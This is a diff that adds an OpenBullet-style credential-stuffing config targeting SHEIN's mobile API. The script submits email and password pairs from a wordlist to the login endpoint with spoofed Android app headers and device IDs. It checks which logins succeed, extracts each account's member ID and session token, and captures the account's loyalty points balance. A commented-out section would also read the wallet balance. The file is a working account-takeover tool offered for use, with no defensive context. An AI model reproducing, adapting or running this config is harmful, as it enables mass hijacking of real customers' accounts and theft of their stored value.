@@ -1,0 +1,153 @@
+[SETTINGS]
+{
+  "Name": "SHEIN",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-11T20:57:52.4672465-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api-service.shein.com/user/common_login" 
+  CONTENT "email=<USER>&password=<PASS>&challenge=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "app-from: shein" 
+  HEADER "SiteUID: android" 
+  HEADER "appcountry: US" 
+  HEADER "ClientId: 100" 
+  HEADER "Devtype: Android" 
+  HEADER "Accept: application/json" 
+  HEADER "Device: SM-G955N Android5.1.1" 
+  HEADER "UserCountry: US" 
+  HEADER "AppLanguage: en" 
+  HEADER "version: 7.0.0" 
+  HEADER "SortUid: 125768712" 
+  HEADER "dev-id: shein_7be319ec-2849-416c-a160-cea0d73e4e94" 
+  HEADER "AppType: shein" 
+  HEADER "LocalCountry: US" 
+  HEADER "DeviceId: shein_5be319ec-2849-416c-a160-cea0d73e41231" 
+  HEADER "AppName: shein app" 
+  HEADER "AppVersion: 7.0.0" 
+  HEADER "Language: en" 
+  HEADER "currency: USD" 
+  HEADER "network-type: WIFI" 
+  HEADER "AppCurrency: USD" 
+  HEADER "user-agent: Shein 7.0.0 Android 5.1.1 SM-G955N US en" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 60" 
+  HEADER "Host: api-service.shein.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "member_id" 
+  KEYCHAIN Failure OR 
+    KEY "The Email Address or Password you entered is incorrect" 
+
+PARSE "<SOURCE>" LR "{\"member_id\": \"" "\"" -> VAR "ID" 
+
+PARSE "<SOURCE>" LR "\"token\": \"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://api-service.shein.com/user/get_user_points?page=1&limit=5" 
+  
+  HEADER "app-from: shein" 
+  HEADER "SiteUID: android" 
+  HEADER "appcountry: US" 
+  HEADER "ClientId: 100" 
+  HEADER "Devtype: Android" 
+  HEADER "Accept: application/json" 
+  HEADER "Device: SM-G955N Android5.1.1" 
+  HEADER "UserCountry: US" 
+  HEADER "AppLanguage: en" 
+  HEADER "version: 7.0.0" 
+  HEADER "SortUid: <ID>" 
+  HEADER "dev-id: shein_5be319ec-2849-416c-a160-cea0d73e41231" 
+  HEADER "AppType: shein" 
+  HEADER "LocalCountry: US" 
+  HEADER "DeviceId: shein_5be319ec-2849-416c-a160-cea0d73e41231" 
+  HEADER "AppName: shein app" 
+  HEADER "AppVersion: 7.0.0" 
+  HEADER "NewUid: 1006161469" 
+  HEADER "Language: en" 
+  HEADER "currency: USD" 
+  HEADER "token: <TOKEN>" 
+  HEADER "network-type: WIFI" 
+  HEADER "AppCurrency: USD" 
+  HEADER "user-agent: Shein 7.0.0 Android 5.1.1 SM-G955N US en 1006161469" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 54" 
+  HEADER "Host: api-service.shein.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" LR "total\": " "," -> VAR "POINTS" 
+
+PARSE "<SOURCE>" LR "= " "\"" CreateEmpty=FALSE -> CAP "BALANCE" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<POINTS>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<POINTS>" GreaterThan "0" 
+
+!REQUEST GET "https://api-service.shein.com/user/wallet_get_balance" 
+!  
+!  HEADER "app-from: shein" 
+!  HEADER "SiteUID: android" 
+!  HEADER "appcountry: US" 
+!  HEADER "ClientId: 100" 
+!  HEADER "Devtype: Android" 
+!  HEADER "Accept: application/json" 
+!  HEADER "Device: SM-G955N Android5.1.1" 
+!  HEADER "UserCountry: US" 
+!  HEADER "AppLanguage: en" 
+!  HEADER "version: 7.0.0" 
+!  HEADER "SortUid: <ID>" 
+!  HEADER "dev-id: shein_5be319ec-2849-416c-a160-cea0d73e41231" 
+!  HEADER "AppType: shein" 
+!  HEADER "LocalCountry: US" 
+!  HEADER "DeviceId: shein_5be319ec-2849-416c-a160-cea0d73e41231" 
+!  HEADER "AppName: shein app" 
+!  HEADER "AppVersion: 7.0.0" 
+!  HEADER "NewUid: 1006161469" 
+!  HEADER "Language: en" 
+!  HEADER "currency: USD" 
+!  HEADER "token: <TOKEN>" 
+!  HEADER "network-type: WIFI" 
+!  HEADER "AppCurrency: USD" 
+!  HEADER "user-agent: Shein 7.0.0 Android 5.1.1 SM-G955N US en 1006161469" 
+!  HEADER "Content-Type: application/x-www-form-urlencoded" 
+!  HEADER "Content-Length: 54" 
+!  HEADER "Host: api-service.shein.com" 
+!  HEADER "Connection: Keep-Alive" 
+!  HEADER "Accept-Encoding: gzip" 
+
+!PARSE "<SOURCE>" LR "[" "]" CreateEmpty=FALSE -> CAP "WALLET" 
+
